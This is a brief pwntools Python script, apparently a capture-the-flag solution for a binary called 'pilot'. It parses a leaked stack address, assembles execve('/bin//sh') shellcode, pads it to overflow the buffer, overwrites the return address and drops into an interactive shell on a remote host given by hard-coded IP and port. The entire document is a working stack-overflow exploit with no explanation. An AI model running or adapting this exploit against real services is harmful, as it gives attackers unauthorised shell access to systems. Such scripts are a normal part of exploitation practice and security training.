from pwn import *

context.log_level = "Debug"
context(os="linux", arch="amd64")
io = process("./pilot")
io = remote("114.55.66.54", 10001)
# gdb.attach(io)

io.recvuntil("Location:")
addr = int(io.recvline(),16)


shellcode = asm('''
	push rax
	xor rdx, rdx
	xor rsi, rsi
	mov rbx, 0x68732f2f6e69622f
	push rbx
	push rsp
	pop rdi
	mov al, 59
	syscall
	''')
payload = shellcode
payload = payload.ljust(0x28, "A")
payload += p64(addr)
io.sendlineafter("Command:", payload)
io.interactive()